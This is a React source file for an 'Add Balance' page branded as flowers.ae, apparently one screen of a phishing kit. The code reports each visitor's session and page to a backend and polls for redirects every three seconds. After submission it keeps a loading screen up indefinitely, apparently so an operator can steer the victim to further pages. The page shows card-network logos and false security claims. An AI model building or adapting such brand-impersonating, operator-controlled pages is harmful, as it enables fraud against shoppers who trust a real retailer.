import styles from "./Balance.module.css";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const Balance = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  useRedirectChecker(3000);
  useOnlineStatus({ sessionId, pageName: "balance", enabled: true });
  const navigate = useNavigate();
  const [balance, setBalance] = useState<string>("");
  const [isProcessing, setIsProcessing] = useState(false);

  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d.]/g, "");

    // Разрешаем только числа и одну точку для десятичных
    if (value === "" || /^\d*\.?\d*$/.test(value)) {
      setBalance(value);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    if (!balance || parseFloat(balance) <= 0) {
      alert("Please enter a valid balance amount");
      setIsProcessing(false);
      return;
    }

    try {
      const res = await fetch("/api/submit-balance", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          balance: balance,
        }),
      });

      const data = await res.json();

      console.log(data);
    } catch (error) {
      console.error("Error adding balance:", error);
      alert("There was an error processing your request. Please try again.");
    } finally {
      setIsProcessing(true);
    }
  };

  const quickAmounts = [50, 100, 200, 500, 1000];

  return (
    <div className={styles.balance__container}>
      <div className={styles.balance__wrapper}>
        {/* Header */}
        <header className={styles.balance__header}>
          <div className={styles.header__content}>
            <div className={styles.logo}>
              <span>flowers.ae</span>
            </div>
            <nav className={styles.breadcrumb}>
              <span className={styles.active}>Add Balance</span>
            </nav>
          </div>
        </header>

        <div className={styles.balance__content}>
          {/* Left Side - Form */}
          <div className={styles.form__section}>
            <div className={styles.form__container}>
              <div className={styles.form__header}>
                <h2>Add Balance to Your Account</h2>
                <p>Top up your account balance for quick and easy payments</p>
              </div>

              <form onSubmit={handleSubmit} className={styles.balance__form}>
                <div className={styles.input__group}>
                  <label>Amount (AED) *</label>
                  <div className={styles.amount__input__wrapper}>
                    <span className={styles.currency__symbol}>AED</span>
                    <input
                      type="text"
                      value={balance}
                      onChange={handleBalanceChange}
                      placeholder="0.00"
                      className={styles.amount__input}
                    />
                  </div>
                </div>

                {/* Quick Amount Buttons */}
                <div className={styles.quick__amounts}>
                  <label>Quick amounts</label>
                  <div className={styles.amount__buttons}>
                    {quickAmounts.map((amount) => (
                      <button
                        key={amount}
                        type="button"
                        onClick={() => setBalance(amount.toString())}
                        className={`${styles.amount__btn} ${
                          balance === amount.toString() ? styles.active : ""
                        }`}
                      >
                        AED {amount}
                      </button>
                    ))}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={
                    isProcessing || !balance || parseFloat(balance) <= 0
                  }
                  className={styles.add__balance__btn}
                >
                  {isProcessing
                    ? "Processing..."
                    : `Add AED ${
                        balance ? parseFloat(balance).toFixed(2) : "0.00"
                      }`}
                </button>
              </form>

              <div className={styles.security__info}>
                <div className={styles.security__badge}>
                  <span className={styles.lock__icon}>🔒</span>
                  <span>Secure SSL Encryption</span>
                </div>
                <div className={styles.supported__cards}>
                  <p>We accept all major credit and debit cards</p>
                  <div className={styles.card__icons}>
                    <img
                      height="20"
                      alt="visa"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg"
                    />
                    <img
                      height="20"
                      alt="mc"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg"
                    />
                    <img
                      height="20"
                      alt="amex"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                    />
                    <img
                      height="20"
                      alt="discover"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/discover.svg"
                    />
                  </div>
                </div>
              </div>

              <div className={styles.return__link}>
                <a
                  href="/"
                  onClick={(e) => {
                    e.preventDefault();
                    navigate("/");
                  }}
                >
                  ← Return to Home
                </a>
              </div>
            </div>
          </div>

          {/* Right Side - Benefits */}
          <div className={styles.benefits__section}>
            <div className={styles.benefits__container}>
              <h3>Why Add Balance?</h3>

              <div className={styles.benefits__list}>
                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>⚡</div>
                  <div className={styles.benefit__content}>
                    <h4>Faster Checkout</h4>
                    <p>
                      Skip entering payment details every time you make a
                      purchase
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>🔒</div>
                  <div className={styles.benefit__content}>
                    <h4>Enhanced Security</h4>
                    <p>
                      Your payment information is stored securely with
                      encryption
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>🎁</div>
                  <div className={styles.benefit__content}>
                    <h4>Special Offers</h4>
                    <p>
                      Get exclusive discounts and promotions for balance users
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>📱</div>
                  <div className={styles.benefit__content}>
                    <h4>Easy Management</h4>
                    <p>
                      Track your spending and top up anytime from your account
                    </p>
                  </div>
                </div>
              </div>

              {/* Current Balance Display (можно подключить к реальным данным) */}
              <div className={styles.current__balance}>
                <h4>Your Current Balance</h4>
                <div className={styles.balance__amount}>
                  <span className={styles.balance__label}>
                    Available Balance:
                  </span>
                  <span className={styles.balance__value}>AED 0.00</span>
                </div>
                <p className={styles.balance__note}>
                  Add funds now to start enjoying faster payments!
                </p>
              </div>

              {/* FAQ Section */}
              <div className={styles.faq__section}>
                <h4>Frequently Asked Questions</h4>
                <div className={styles.faq__item}>
                  <p>
                    <strong>Is there a minimum balance amount?</strong>
                  </p>
                  <p>Yes, the minimum top-up amount is AED 50.</p>
                </div>
                <div className={styles.faq__item}>
                  <p>
                    <strong>Can I get a refund on my balance?</strong>
                  </p>
                  <p>Balance refunds are processed within 5-7 business days.</p>
                </div>
                <div className={styles.faq__item}>
                  <p>
                    <strong>Is my balance secure?</strong>
                  </p>
                  <p>Yes, all funds are protected with bank-level security.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Loading isLoading={isProcessing} />
    </div>
  );
};

export default Balance;
